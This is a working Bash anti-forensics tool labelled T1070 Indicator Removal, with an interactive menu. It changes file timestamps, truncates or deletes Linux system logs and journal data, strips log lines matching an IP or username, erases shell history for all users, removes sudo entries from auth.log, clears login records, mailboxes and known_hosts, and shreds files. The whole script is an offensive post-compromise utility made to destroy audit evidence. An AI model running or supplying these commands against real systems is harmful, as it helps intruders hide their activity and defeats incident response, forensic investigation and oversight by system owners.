#!/bin/bash
#
# anti_forensics.sh — T1070 Indicator Removal / Anti-Forensics
#
# Timestomp files, wipe logs, destroy history, secure-delete artifacts,
# clear persistence traces, scrub metadata.
#

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

banner_antiforensics() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════════════╗"
    echo "  ║   T1070 — Anti-Forensics / Indicator Removal          ║"
    echo "  ║   Timestomp, log wipe, metadata scrub                 ║"
    echo "  ╚═══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] Root required.${NC}"
        return 1
    fi
    return 0
}

# ── [1] Timestomp files ──
timestomp() {
    echo -e "${CYAN}[*] Timestomp — modify file timestamps${NC}"
    echo ""
    echo -e "${YELLOW}[?] Target file or directory:${NC}"
    read -r TARGET
    echo -e "${YELLOW}[?] Reference file (copy timestamps from) or timestamp:${NC}"
    echo "  [1] Copy from reference file"
    echo "  [2] Set specific date (YYYY-MM-DD HH:MM:SS)"
    echo "  [3] Set to epoch (1970-01-01)"
    echo "  [4] Randomize within last 365 days"
    read -r METHOD

    if [[ ! -e "$TARGET" ]]; then
        echo -e "${RED}[!] Target does not exist: ${TARGET}${NC}"
        return 1
    fi

    case "$METHOD" in
        1)
            echo -e "${YELLOW}[?] Reference file path:${NC}"
            read -r REF_FILE
            if [[ ! -f "$REF_FILE" ]]; then
                echo -e "${RED}[!] Reference file not found.${NC}"
                return 1
            fi
            if [[ -d "$TARGET" ]]; then
                find "$TARGET" -exec touch -r "$REF_FILE" {} + 2>/dev/null
            else
                touch -r "$REF_FILE" "$TARGET" 2>/dev/null
            fi
            echo -e "${GREEN}[+] Timestamps copied from ${REF_FILE}${NC}"
            ;;
        2)
            echo -e "${YELLOW}[?] Date (YYYY-MM-DD HH:MM:SS):${NC}"
            read -r DATE_STR
            if [[ -d "$TARGET" ]]; then
                find "$TARGET" -exec touch -d "$DATE_STR" {} + 2>/dev/null
            else
                touch -d "$DATE_STR" "$TARGET" 2>/dev/null
            fi
            echo -e "${GREEN}[+] Timestamps set to ${DATE_STR}${NC}"
            ;;
        3)
            if [[ -d "$TARGET" ]]; then
                find "$TARGET" -exec touch -t 197001010000.00 {} + 2>/dev/null
            else
                touch -t 197001010000.00 "$TARGET" 2>/dev/null
            fi
            echo -e "${GREEN}[+] Timestamps set to epoch${NC}"
            ;;
        4)
            local now
            now=$(date +%s)
            if [[ -d "$TARGET" ]]; then
                find "$TARGET" -type f | while IFS= read -r f; do
                    local random_offset=$((RANDOM % 31536000))
                    local new_time=$((now - random_offset))
                    touch -d "@${new_time}" "$f" 2>/dev/null
                done
            else
                local random_offset=$((RANDOM % 31536000))
                local new_time=$((now - random_offset))
                touch -d "@${new_time}" "$TARGET" 2>/dev/null
            fi
            echo -e "${GREEN}[+] Timestamps randomized within last year${NC}"
            ;;
        *) echo -e "${RED}[!] Invalid method.${NC}"; return 1 ;;
    esac
}

# ── [2] Wipe system logs ──
wipe_logs() {
    check_root || return 1

    echo -e "${CYAN}[*] Wiping system logs...${NC}"
    echo ""
    echo -e "${YELLOW}[?] Wipe mode:${NC}"
    echo "  [1] Truncate all logs (files remain, content cleared)"
    echo "  [2] Remove log files entirely"
    echo "  [3] Selective — remove specific entries"
    read -r MODE

    local -a LOG_DIRS=(/var/log)
    local -a LOG_FILES=(
        /var/log/syslog /var/log/auth.log /var/log/kern.log
        /var/log/messages /var/log/secure /var/log/boot.log
        /var/log/cron /var/log/daemon.log /var/log/dpkg.log
        /var/log/faillog /var/log/lastlog /var/log/wtmp
        /var/log/btmp /var/log/utmp
    )

    case "$MODE" in
        1)
            for logf in "${LOG_FILES[@]}"; do
                if [[ -f "$logf" ]]; then
                    : > "$logf" 2>/dev/null
                    echo -e "${GREEN}  [+] Truncated: ${logf}${NC}"
                fi
            done
            # Also truncate rotated logs
            find /var/log -name "*.log.*" -exec truncate -s 0 {} \; 2>/dev/null
            find /var/log -name "*.gz" -delete 2>/dev/null
            # Clear journal
            journalctl --vacuum-time=1s 2>/dev/null
            echo -e "${GREEN}[+] All logs truncated.${NC}"
            ;;
        2)
            for logf in "${LOG_FILES[@]}"; do
                if [[ -f "$logf" ]]; then
                    rm -f "$logf" 2>/dev/null
                    echo -e "${GREEN}  [+] Removed: ${logf}${NC}"
                fi
            done
            find /var/log -name "*.log.*" -delete 2>/dev/null
            find /var/log -name "*.gz" -delete 2>/dev/null
            journalctl --vacuum-time=1s 2>/dev/null
            echo -e "${GREEN}[+] Log files removed.${NC}"
            ;;
        3)
            echo -e "${YELLOW}[?] Pattern to remove from logs (e.g. IP, username):${NC}"
            read -r PATTERN
            if [[ -z "$PATTERN" ]]; then
                echo -e "${RED}[!] Pattern required.${NC}"
                return 1
            fi
            for logf in "${LOG_FILES[@]}"; do
                if [[ -f "$logf" ]]; then
                    local before
                    before=$(wc -l < "$logf" 2>/dev/null)
                    sed -i "/${PATTERN}/d" "$logf" 2>/dev/null
                    local after
                    after=$(wc -l < "$logf" 2>/dev/null)
                    local removed=$((before - after))
                    if [[ $removed -gt 0 ]]; then
                        echo -e "${GREEN}  [+] ${logf}: removed ${removed} lines${NC}"
                    fi
                fi
            done
            echo -e "${GREEN}[+] Selective log cleaning done.${NC}"
            ;;
        *) echo -e "${RED}[!] Invalid mode.${NC}"; return 1 ;;
    esac
}

# ── [3] Destroy command history ──
destroy_history() {
    echo -e "${CYAN}[*] Destroying command history...${NC}"

    # Current user
    history -c 2>/dev/null
    cat /dev/null > ~/.bash_history 2>/dev/null
    cat /dev/null > ~/.zsh_history 2>/dev/null
    cat /dev/null > ~/.python_history 2>/dev/null
    cat /dev/null > ~/.mysql_history 2>/dev/null
    cat /dev/null > ~/.psql_history 2>/dev/null
    cat /dev/null > ~/.node_repl_history 2>/dev/null
    rm -f ~/.viminfo ~/.lesshst ~/.wget-hsts 2>/dev/null

    echo -e "${GREEN}  [+] Current user history cleared${NC}"

    echo -e "${YELLOW}[?] Clear for ALL users? [y/N]:${NC}"
    read -r ALL_USERS

    if [[ "$ALL_USERS" =~ ^[Yy] ]]; then
        check_root || return 1
        for home_dir in /root /home/*; do
            [[ -d "$home_dir" ]] || continue
            for histf in .bash_history .zsh_history .python_history .mysql_history .psql_history .node_repl_history; do
                cat /dev/null > "${home_dir}/${histf}" 2>/dev/null
            done
            rm -f "${home_dir}/.viminfo" "${home_dir}/.lesshst" "${home_dir}/.wget-hsts" 2>/dev/null
            echo -e "${GREEN}  [+] Cleared: ${home_dir}${NC}"
        done
    fi

    echo -e "${GREEN}[+] History destroyed.${NC}"
}

# ── [4] Secure delete ──
secure_delete() {
    echo -e "${CYAN}[*] Secure delete — overwrite before removal${NC}"
    echo ""
    echo -e "${YELLOW}[?] File or directory to securely delete:${NC}"
    read -r TARGET

    if [[ ! -e "$TARGET" ]]; then
        echo -e "${RED}[!] Target not found: ${TARGET}${NC}"
        return 1
    fi

    echo -e "${YELLOW}[?] Overwrite passes [default: 3]:${NC}"
    read -r PASSES
    PASSES="${PASSES:-3}"

    if command -v shred &>/dev/null; then
        if [[ -d "$TARGET" ]]; then
            find "$TARGET" -type f -exec shred -vzfun "$PASSES" {} \; 2>/dev/null
            rm -rf "$TARGET" 2>/dev/null
        else
            shred -vzfun "$PASSES" "$TARGET" 2>/dev/null
        fi
        echo -e "${GREEN}[+] Securely deleted with shred (${PASSES} passes)${NC}"
    else
        # Fallback: dd overwrite
        if [[ -f "$TARGET" ]]; then
            local size
            size=$(stat -c %s "$TARGET")
            for ((i=1; i<=PASSES; i++)); do
                dd if=/dev/urandom of="$TARGET" bs=1 count="$size" conv=notrunc 2>/dev/null
            done
            rm -f "$TARGET"
            echo -e "${GREEN}[+] Overwritten with urandom (${PASSES} passes) and removed${NC}"
        elif [[ -d "$TARGET" ]]; then
            find "$TARGET" -type f | while IFS= read -r f; do
                local fsize
                fsize=$(stat -c %s "$f")
                for ((i=1; i<=PASSES; i++)); do
                    dd if=/dev/urandom of="$f" bs=1 count="$fsize" conv=notrunc 2>/dev/null
                done
                rm -f "$f"
            done
            rm -rf "$TARGET" 2>/dev/null
            echo -e "${GREEN}[+] Directory securely deleted${NC}"
        fi
    fi
}

# ── [5] Clear persistence traces ──
clear_traces() {
    check_root || return 1

    echo -e "${CYAN}[*] Clearing common persistence traces...${NC}"

    # Remove recently-used files
    rm -f ~/.local/share/recently-used.xbel 2>/dev/null
    rm -rf ~/.local/share/Trash/* 2>/dev/null

    # Clear tmp
    rm -rf /tmp/.d3m0n* /tmp/.X* 2>/dev/null

    # Clear utmp/wtmp/btmp (login records)
    : > /var/log/wtmp 2>/dev/null
    : > /var/log/btmp 2>/dev/null
    : > /var/run/utmp 2>/dev/null
    echo -e "${GREEN}  [+] Login records cleared (utmp/wtmp/btmp)${NC}"

    # Clear lastlog
    : > /var/log/lastlog 2>/dev/null
    echo -e "${GREEN}  [+] lastlog cleared${NC}"

    # Clear sudo logs
    if [[ -f /var/log/auth.log ]]; then
        sed -i '/sudo/d' /var/log/auth.log 2>/dev/null
        echo -e "${GREEN}  [+] Sudo entries removed from auth.log${NC}"
    fi

    # Clear mail
    for mbox in /var/mail/* /var/spool/mail/*; do
        [[ -f "$mbox" ]] && : > "$mbox" 2>/dev/null
    done
    echo -e "${GREEN}  [+] Mailboxes cleared${NC}"

    # Clear SSH known hosts additions
    for home_dir in /root /home/*; do
        [[ -f "${home_dir}/.ssh/known_hosts" ]] && : > "${home_dir}/.ssh/known_hosts" 2>/dev/null
    done
    echo -e "${GREEN}  [+] SSH known_hosts cleared${NC}"

    echo -e "${GREEN}[+] Persistence traces cleaned.${NC}"
}

# ── [6] Metadata scrub ──
metadata_scrub() {
    echo -e "${CYAN}[*] Metadata scrub — remove file metadata${NC}"
    echo ""
    echo -e "${YELLOW}[?] Target file or directory:${NC}"
    read -r TARGET

    if [[ ! -e "$TARGET" ]]; then
        echo -e "${RED}[!] Target not found.${NC}"
        return 1
    fi

    if command -v exiftool &>/dev/null; then
        if [[ -d "$TARGET" ]]; then
            exiftool -overwrite_original -all= -r "$TARGET" 2>/dev/null
        else
            exiftool -overwrite_original -all= "$TARGET" 2>/dev/null
        fi
        echo -e "${GREEN}[+] Metadata stripped with exiftool${NC}"
    elif command -v mat2 &>/dev/null; then
        if [[ -d "$TARGET" ]]; then
            find "$TARGET" -type f -exec mat2 {} \; 2>/dev/null
        else
            mat2 "$TARGET" 2>/dev/null
        fi
        echo -e "${GREEN}[+] Metadata stripped with mat2${NC}"
    else
        echo -e "${YELLOW}[!] Neither exiftool nor mat2 found.${NC}"
        echo -e "${YELLOW}[*] Install: apt install libimage-exiftool-perl${NC}"
        echo ""
        echo -e "${YELLOW}[*] Falling back to basic attribute stripping...${NC}"
        if [[ -d "$TARGET" ]]; then
            find "$TARGET" -type f -exec bash -c '
                for f; do
                    # Strip xattrs
                    for attr in $(getfattr -d "$f" 2>/dev/null | grep -oP "^[^=]+"); do
                        setfattr -x "$attr" "$f" 2>/dev/null
                    done
                done
            ' _ {} +
        else
            for attr in $(getfattr -d "$TARGET" 2>/dev/null | grep -oP "^[^=]+"); do
                setfattr -x "$attr" "$TARGET" 2>/dev/null
            done
        fi
        echo -e "${GREEN}[+] Extended attributes stripped${NC}"
    fi
}

# ── MAIN MENU ──
main_menu() {
    banner_antiforensics
    echo -e "  ${CYAN}[1]${NC} Timestomp files"
    echo -e "  ${CYAN}[2]${NC} Wipe system logs"
    echo -e "  ${CYAN}[3]${NC} Destroy command history"
    echo -e "  ${CYAN}[4]${NC} Secure delete (shred)"
    echo -e "  ${CYAN}[5]${NC} Clear persistence traces"
    echo -e "  ${CYAN}[6]${NC} Metadata scrub"
    echo ""
    echo -e "${YELLOW}[?] Select option:${NC} "
    read -r OPT

    case "$OPT" in
        1) timestomp ;;
        2) wipe_logs ;;
        3) destroy_history ;;
        4) secure_delete ;;
        5) clear_traces ;;
        6) metadata_scrub ;;
        *) echo -e "${RED}[!] Invalid option.${NC}" ;;
    esac
}

main_menu
